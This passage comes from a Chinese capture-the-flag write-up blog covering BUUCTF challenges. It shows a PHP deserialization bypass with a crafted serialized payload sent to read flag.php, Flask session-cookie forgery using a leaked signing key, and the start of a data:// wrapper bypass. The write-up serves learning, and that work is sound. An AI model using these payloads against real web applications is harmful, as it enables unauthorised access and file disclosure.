class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$s</span>); <span class=\"hljs-variable\">$i</span>++)<br>        <span class=\"hljs-keyword\">if</span>(!(<span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &gt;= <span class=\"hljs-number\">32</span> &amp;&amp; <span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &lt;= <span class=\"hljs-number\">125</span>))<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>&#125;<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>&#123;<span class=\"hljs-string\">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class=\"hljs-variable\">$str</span> = (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;str&#x27;</span>];<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">is_valid</span>(<span class=\"hljs-variable\">$str</span>)) &#123;<br>        <span class=\"hljs-variable\">$obj</span> = <span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>    <span class=\"hljs-variable\">$op</span> = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>    <span class=\"hljs-variable\">$filename</span> = <span class=\"hljs-string\">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-string\">&quot;Hello World!&quot;</span>;<br>    <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>__construct()å‡½æ•°æ²¡æœ‰ç”¨ï¼Œä¸å‚ä¸åºåˆ—åŒ–ä¸­</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">is_valid</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$s</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$i</span> &lt; <span class=\"hljs-title function_ invoke__\">strlen</span>(<span class=\"hljs-variable\">$s</span>); <span class=\"hljs-variable\">$i</span>++)<br>        <span class=\"hljs-keyword\">if</span>(!(<span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &gt;= <span class=\"hljs-number\">32</span> &amp;&amp; <span class=\"hljs-title function_ invoke__\">ord</span>(<span class=\"hljs-variable\">$s</span>[<span class=\"hljs-variable\">$i</span>]) &lt;= <span class=\"hljs-number\">125</span>))<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">true</span>;<br>&#125;<br><span class=\"hljs-comment\">//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</span><br><span class=\"hljs-comment\">// ASCIIå€¼32ä¸º2ï¼ŒASCIIå€¼125ä¸º%</span><br></code></pre></td></tr></table></figure>\n\n<p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯è¿‡æ»¤æ‰protectç±»çš„æˆå‘˜,åœ¨åºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä»¥%00ä½œä¸ºæ ‡è¯†ç¬¦</p>\n<figure class=\"highlight lasso\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lasso\">*ä½†æ˜¯åœ¨PHPç‰ˆæœ¬å¤§äº<span class=\"hljs-number\">7.1</span>çš„æƒ…å†µä¸‹ï¼Œ<span class=\"hljs-keyword\">protect</span>ç±»å’Œ<span class=\"hljs-keyword\">public</span>ç±»æ²¡ä»€ä¹ˆå¥½æ³¨æ„çš„ï¼Œæ‰€ä»¥åœ¨æ„é€ åºåˆ—åŒ–æ—¶æ”¹ä¸º<span class=\"hljs-keyword\">public</span>å¯ä»¥ç»•è¿‡is_validå‡½æ•°<br></code></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>    <span class=\"hljs-variable language_\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>    <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">process</span>();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>__destruc()å‡½æ•°ä¸»è¦æ˜¯ä¸è®©<code>op===&quot;2&quot;</code>ï¼Œä½†æ˜¯åœ¨processå‡½æ•°é‡Œopåˆè¦ä¸ºâ€œ2â€</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">process</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;1&quot;</span>) &#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">write</span>();<br>    &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable language_\">$this</span>-&gt;op == <span class=\"hljs-string\">&quot;2&quot;</span>) &#123;<br>        <span class=\"hljs-variable\">$res</span> = <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">read</span>();<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-variable\">$res</span>);<br>    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">output</span>(<span class=\"hljs-string\">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>æ‰€ä»¥è¿™é‡Œåˆ©ç”¨å¼ºå¼±ç±»å‹æ¯”è¾ƒï¼Œ__destruc()å‡½æ•°é‡Œopæ˜¯ä¸èƒ½ä¸º2ï¼Œä½†æ˜¯æ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œæ˜¯å­—ç¬¦2ã€â€2â€ã€‘,æ‰€ä»¥op&#x3D;2ã€æ•°å­—2ã€‘ï¼Œå°±ç»•è¿‡è¾¾åˆ°è¯»å–flag.phpçš„ç»“æœ</p>\n<p>äºæ˜¯æ„é€ å‡ºphpåºåˆ—åŒ–</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">FileHandler</span> </span>&#123;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$op</span>=<span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$filename</span>=<span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$content</span>;<br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FileHandler</span>();<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">serialize</span>(<span class=\"hljs-variable\">$a</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>å¾—åˆ°åºåˆ—åŒ–ç»“æœ</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">O</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-string\">&quot;FileHandler&quot;</span>:<span class=\"hljs-number\">3</span>ï¼š&#123;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">&quot;op&quot;</span>;i:<span class=\"hljs-number\">2</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">&quot;filename&quot;</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">&quot;flag.php&quot;</span>;s:<span class=\"hljs-number\">7</span>:<span class=\"hljs-string\">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>\n\n<p>è®¿é—®ï¼ŒF12æŸ¥çœ‹ã€æˆ–è€…æ”¹ä¸€ä¸‹filenameçš„å€¼ä¸ºphp:&#x2F;&#x2F;filterä¼ªåè®®ï¼Œç”¨base64ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°ã€‘</p>\n<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>\n<p>å¾—åˆ°flag</p>\n<p><img src=\"/post/wp-buuctf/image-20220822135717175.png\" alt=\"image-20220822135717175\"></p>\n<h2 id=\"7-HCTF-2018-admin\"><a href=\"#7-HCTF-2018-admin\" class=\"headerlink\" title=\"7.[HCTF 2018]admin\"></a>7.[HCTF 2018]admin</h2><h3 id=\"1-é¢˜ç›®æè¿°-4\"><a href=\"#1-é¢˜ç›®æè¿°-4\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-4\"><a href=\"#2-wp-4\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>è¿™é“é¢˜å¼€å§‹å½“ä½œå¼±å¯†ç é¢˜è§£ï¼Œç»“æœç›´æ¥çˆ†ç ´å‡ºæ¥äº†</p>\n<p>ç”¨æˆ·åï¼šadmin</p>\n<p>å¯†ç ï¼š123</p>\n<p>è¿™æ ·åº”è¯¥æœ€ç®€å•çš„æ–¹æ³•äº†</p>\n<p>ä½†æˆ‘çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬wpï¼Œä»–ä»¬æŠŠè¿™ä¸ªå½“ä½œflask_sessionä¼ªé€ çš„é¢˜ç›®</p>\n<p>å­¦ä¹ ä¸€ä¸‹</p>\n<p>å…ˆæ³¨å†Œä¸€ä¸ªè¯•è¯•</p>\n<p>ç”¨æˆ·åï¼šadmin123</p>\n<p>å¯†ç ï¼š123456</p>\n<p><img src=\"/post/wp-buuctf/image-20220822203857056.png\" alt=\"image-20220822203857056\"></p>\n<p>åªåœ¨<code>change password</code>çš„æºç çœ‹åˆ°çº¿ç´¢ï¼ŒçŸ¥é“æ˜¯flaskæ¡†æ¶</p>\n<p><img src=\"/post/wp-buuctf/image-20220822203848108.png\" alt=\"image-20220822203848108\"></p>\n<p>è®¿é—®ä¸‹è½½æ–‡ä»¶</p>\n<p>flaskå­˜åœ¨ä¸€ä¸ªsessionä¼ªé€ æ¼æ´</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">flaskçš„<span class=\"hljs-keyword\">session</span>ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œä¸€èˆ¬åªæ˜¯åŠ äº†ç­¾åæ¥é˜²æ­¢è¢«æˆªå–ä¿®æ”¹ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åŠ å¯†æˆ‘ä»¬å°±å¯ä»¥å¯¹<span class=\"hljs-keyword\">session</span>è¿›è¡Œè§£ç æ¥è·å–å…¶ä¸­çš„ç”¨æˆ·æ•°æ®ã€‚ <br><br>å¦‚æœæˆ‘ä»¬åœ¨è·å–åˆ°ç­¾åçš„ç§˜é’¥ï¼Œå°±å¯ä»¥æŒ‰ç…§è§£ç å‡ºæ¥çš„æ•°æ®è¿›è¡Œä¼ªé€ ï¼Œé‡æ–°ç”Ÿæˆç­¾åçš„<span class=\"hljs-keyword\">session</span>æ¥è¾¾åˆ°æ¬ºéª—æœåŠ¡ç«¯ã€‚  <br><br>flaskçš„<span class=\"hljs-keyword\">session</span>ä½¿ç”¨base64å¯¹bytesç±»å‹çš„ç”¨æˆ·æ•°æ®è¿›è¡Œç¼–ç ï¼Œè€Œä¸”ç¼–ç ä¹‹å‰å¯èƒ½è¿›è¡Œäº†å‹ç¼©(<span class=\"hljs-keyword\">session</span>ä»¥ &quot;.&quot;  å¼€å¤´æ—¶è¡¨ç¤ºè¿›è¡Œäº†å‹ç¼©) flask ä¿å­˜åœ¨cookieé‡Œé¢çš„<span class=\"hljs-keyword\">session</span>ä¸€èˆ¬æ ¼å¼ä¸º data.timestamp.signature<br></code></pre></td></tr></table></figure>\n\n<p>è¿™é‡Œçš„sessionæ²¡æœ‰åŠ å¯†ï¼Œåœ¨config.pyä¸­å¾—åˆ°äº†ç­¾åç§˜é’¥<code>ckj123</code>ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é‡æ–°ç”Ÿæˆsessionï¼Œæ¥æ¬ºéª—æœåŠ¡å™¨</p>\n<p><img src=\"/post/wp-buuctf/image-20220822204409898.png\" alt=\"image-20220822204409898\"></p>\n<p>åˆ©ç”¨cookie editoræŸ¥çœ‹sessionå€¼</p>\n<p><img src=\"/post/wp-buuctf/image-20220822231718091.png\" alt=\"image-20220822231718091\"></p>\n<p>ç„¶åå†æ‰¾å‘ç°index.htmlä¸‹æœ‰flagæç¤º</p>\n<p><img src=\"/post/wp-buuctf/image-20220823000533344.png\" alt=\"image-20220823000533344\"></p>\n<p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œå°±æ˜¯è®©sessioné‡Œçš„name&#x3D;&#x3D;â€adminâ€</p>\n<p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬å¾—åˆ°çš„session</p>\n<p>è¿™é‡Œå»ºè®®äº†è§£ä¸€ä¸‹ä¸€ä¸ªå·¥å…·<code>flask-session-cookie-manager-master</code>èƒ½å¯¹å…¶è¿›è¡ŒåŠ å¯†è§£ç ã€å¯èƒ½éœ€è¦pipä¸‹ä¸€äº›æ¨¡å—ï¼Œç™¾åº¦å¯ä»¥è§£å†³ã€‘</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">è§£å¯†<br><span class=\"hljs-keyword\">python</span> flask_session_cookie_manager3.<span class=\"hljs-keyword\">py</span> decode -s â€œcxk123â€ -<span class=\"hljs-keyword\">c</span> â€œä½ åœ¨<span class=\"hljs-keyword\">change</span>é¡µé¢çš„sessionå€¼â€<br>åŠ å¯†<br><span class=\"hljs-keyword\">python</span> flask_session_cookie_manager3.<span class=\"hljs-keyword\">py</span> encode -s â€œcxk123â€ -t â€œæŒ‰ç…§å¾—åˆ°è§£å¯†ç»“æœæ ¼å¼æ”¹çš„ç»“æœâ€<br><br><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220822235758750.png\" alt=\"image-20220822235758750\"></p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class=\"hljs-number\">8703</span>c5b8b2d40b<span class=\"hljs-number\">535487</span>2c13dd<span class=\"hljs-number\">4314</span>cccf<span class=\"hljs-number\">9116</span>d2dcd<span class=\"hljs-number\">6598</span>7e5f08b2d6cffdf72cb<span class=\"hljs-number\">7660</span>baeb7d5e76f3ac<span class=\"hljs-number\">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class=\"hljs-number\">3523</span>4b<span class=\"hljs-number\">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br><br>æŠŠæˆ‘ä»¬çš„ç”¨æˆ·åæ”¹ä¸ºadmin<br><br>&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class=\"hljs-number\">8703</span>c5b8b2d40b<span class=\"hljs-number\">535487</span>2c13dd<span class=\"hljs-number\">4314</span>cccf<span class=\"hljs-number\">9116</span>d2dcd<span class=\"hljs-number\">6598</span>7e5f08b2d6cffdf72cb<span class=\"hljs-number\">7660</span>baeb7d5e76f3ac<span class=\"hljs-number\">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class=\"hljs-number\">3523</span>4b<span class=\"hljs-number\">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure>\n\n<p>ç„¶åå†åŠ å¯†</p>\n<p><img src=\"/post/wp-buuctf/image-20220823000020825.png\" alt=\"image-20220823000020825\"></p>\n<p>ç„¶åcookie editorä¿®æ”¹ä¸ºæˆ‘ä»¬åŠ å¯†ç»“æœ</p>\n<figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gcode\">.eJxFUMtu<span class=\"hljs-name\">g0</span>AM_JXK<span class=\"hljs-number\">5</span>xx<span class=\"hljs-number\">4</span>tBekHCKRIiqtEWgJ<span class=\"hljs-number\">8</span>l<span class=\"hljs-number\">4</span>iGkjAy<span class=\"hljs-number\">1</span>IJWlE<span class=\"hljs-number\">2</span>yr<span class=\"hljs-number\">93</span><span class=\"hljs-name\">m1</span>bKwQd<span class=\"hljs-number\">7</span>xvbMXOF<span class=\"hljs-number\">4</span><span class=\"hljs-symbol\">ntq5</span>g-hcD<span class=\"hljs-number\">3</span><span class=\"hljs-meta\">O7</span>gWPfQHSFp<span class=\"hljs-number\">3</span>eIgPhiSTYsuDM<span class=\"hljs-meta\">o956</span>KRaiq<span class=\"hljs-number\">3</span>KJEQ<span class=\"hljs-number\">9</span>xpFR<span class=\"hljs-number\">-6</span>LFEDmfwZ<span class=\"hljs-number\">7</span>c<span class=\"hljs-number\">6</span>SPfRZkq<span class=\"hljs-number\">4</span>qzhfi<span class=\"hljs-number\">0</span>vF<span class=\"hljs-number\">-528</span>sJDpuboUsmAI<span class=\"hljs-number\">0</span>mdx_<span class=\"hljs-meta\">o8</span>lXlaBGLl-yuBmwouVvV<span class=\"hljs-number\">7</span>EySis-rRSkITItZF<span class=\"hljs-number\">4</span>H<span class=\"hljs-number\">4</span>kZjVYbus<span class=\"hljs-number\">6</span>VKrBiTT<span class=\"hljs-number\">1</span>L<span class=\"hljs-number\">7</span>rl<span class=\"hljs-number\">9</span>EQFu<span class=\"hljs-number\">4</span>beA<span class=\"hljs-number\">0</span>T-fj<span class=\"hljs-number\">54</span>dux<span class=\"hljs-number\">4</span>cFq<span class=\"hljs-number\">0</span>OsUifFVZKGwkkTcuBMFp<span class=\"hljs-number\">2</span>T<span class=\"hljs-number\">0</span>otEOWvFgPbkOTkdVWWQ<span class=\"hljs-number\">7</span>bb<span class=\"hljs-number\">3</span>c<span class=\"hljs-number\">72</span>pL<span class=\"hljs-number\">-3</span>jUuhC-Ef<span class=\"hljs-name\">G2</span>jgA<span class=\"hljs-number\">6</span>sb<span class=\"hljs-number\">0</span>I<span class=\"hljs-number\">2</span>zga<span class=\"hljs-number\">26</span><span class=\"hljs-symbol\">ne27</span><span class=\"hljs-keyword\">ge</span><span class=\"hljs-number\">3</span>D<span class=\"hljs-number\">7</span>AeD<span class=\"hljs-number\">4</span>b<span class=\"hljs-number\">34.</span>YwOoDA.quyfjg-Miz<span class=\"hljs-number\">9</span>Y<span class=\"hljs-number\">5</span>cx<span class=\"hljs-number\">6</span>i<span class=\"hljs-number\">5</span>hTVr<span class=\"hljs-number\">0</span>EWjE<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220823000303547.png\" alt=\"image-20220823000303547\"></p>\n<p>å¾—åˆ°flag</p>\n<h2 id=\"8-ZJCTF-2019-NiZhuanSiWei\"><a href=\"#8-ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"8.[ZJCTF 2019]NiZhuanSiWei\"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id=\"1-é¢˜ç›®æè¿°-5\"><a href=\"#1-é¢˜ç›®æè¿°-5\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-5\"><a href=\"#2-wp-5\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>å…ˆåˆ†æä¸€ä¸‹</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"> <span class=\"hljs-meta\">&lt;?php</span>  <br><span class=\"hljs-variable\">$text</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;text&quot;</span>];<br><span class=\"hljs-variable\">$file</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;file&quot;</span>];<br><span class=\"hljs-variable\">$password</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&quot;password&quot;</span>];<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$text</span>)&amp;&amp;(<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>)===<span class=\"hljs-string\">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>).<span class=\"hljs-string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/flag/&quot;</span>,<span class=\"hljs-variable\">$file</span>))&#123;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Not now!&quot;</span>;<br>        <span class=\"hljs-keyword\">exit</span>(); <br>    &#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$file</span>);  <span class=\"hljs-comment\">//useless.php</span><br>        <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$password</span>);<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$password</span>;<br>    &#125;<br>&#125;<br><span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n\n<p>ç¬¬ä¸€ä¸ª</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$text</span>)&amp;&amp;(<span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$text</span>,<span class=\"hljs-string\">&#x27;r&#x27;</span>)===<span class=\"hljs-string\">&quot;welcome to the zjctf&quot;</span>)<span class=\"hljs-comment\">//rä¸ºè¯»å–æƒé™</span><br></code></pre></td></tr></table></figure>\n\n<p>file_get_contents()å‡½æ•°æ˜¯å°†æ–‡ä»¶å†…å®¹è¯»å–åˆ°å˜é‡ï¼Œè€Œè¿™é‡Œæ˜¯ä»å˜é‡è¯»å–ï¼Œè¯»å–textå˜é‡çš„å€¼ï¼Œè¿™é‡Œéœ€è¦textå˜é‡ä¸º<code>welcome to the zjctf</code></p>\n<p>ä½†æ˜¯å› ä¸ºå¯èƒ½å­˜åœ¨å¯¹å˜é‡çš„æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤ï¼Œä¸€èˆ¬æ˜¯ç”¨base64ç»•è¿‡</p>\n<p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨ä¸¤ä¸ªä¼ªåè®®ï¼Œphp:&#x2F;&#x2F;inputå’Œdata:&#x2F;&#x2F;ï¼Œè¿™ä¸¤ä¸ªä¸€ä¸ªæ˜¯è¯»å–postæ•°æ®ï¼Œä¸€ä¸ªæ˜¯è¯»å–getæ•°æ®ï¼Œè¿™é‡Œç”¨data:&#x2F;&#x2F;åè®®</p>\n<figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xl\">?<span class=\"hljs-keyword\">text</span>=<span class=\"hljs-keyword\">data</span>:<span class=\"hljs-comment\">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></code></pre></td></tr></table></figure>\n\n<p>å½“ç„¶è¿™é‡Œä¸ç”¨base64ä¹Ÿå¯ä»¥</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livecodeserver\">?<span class=\"hljs-keyword\">text</span>=data://<span class=\"hljs-keyword\">text</span>/plain;welcome 